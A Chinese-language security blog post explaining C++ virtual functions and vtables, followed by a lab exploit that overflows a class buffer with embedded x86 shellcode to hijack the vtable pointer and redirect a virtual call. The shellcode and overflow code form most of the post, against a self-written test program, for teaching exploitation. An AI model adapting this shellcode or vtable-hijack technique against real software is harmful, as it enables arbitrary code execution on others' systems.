---
title: 攻击C++的虚函数
date: 2017-07-01 18:23:16
categories: 安全技术
tags: [windows, c++]
---

### C++简介

<b>理解虚函数和虚表</b>
1. C++类的成员函数声明时，若使用关键字virtual进行修饰，则被称为虚函数
2. 一个类中可能有多个虚函数
3. 虚函数的入口地址统一保存在虚表(Vtable)之中
4. 对象在使用虚函数时，首先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用

5. <font color=#f00>虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</font>

6. 虚函数只有通过对象指针的引用才能显示其动态调用的特性。

### C++虚函数的利用

实验代码：
<pre><code>
#include "windows.h"
#include "iostream.h"

char shellcode[] =
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x50\xAE\x42\x00";		// set fake virtual function pointer

class Failwest
{
public:
	char buf[200];
	virtual void test(void)
	{
		cout&lt;&lt;"Class Vtable::test()"&lt;&lt;endl;
	};
};

Failwest overflow, *p;

void main(void)
{
	char *p_vtable;
	p_vtable = overflow.buf - 4;		//point to virtual table
	// reset fake virtual table to 0x004088cc
	// the address mat need to ajusted via runtime debug
	__asm int 3;
	p_vtable[0] = 0x00;
	p_vtable[1] = 0xAF;
	p_vtable[2] = 0x42;
	p_vtable[3] = 0x00;
	strcpy(overflow.buf, shellcode);	// set fake virtual function pointer
	p = &overflow;
	p->test();
}
</code></pre>

C++虚函数利用原理图：
![C++虚函数利用原理图](/images/2017-07-01/vtable.jpg)

首先需要知道的是：
* idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。
* data: 这个段存放程序的全局数据、全局常量等。
* rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。

所以我们应该在data段中找到自己需要的实验的全局变量

<font color=#f00>局部变量在栈中</font>


得到shellcode起始地址：0x0042AE50
shellcode结束地址：0x0042AF00

### 实验结果

![实验结果](/images/2017-07-01/result1.jpg)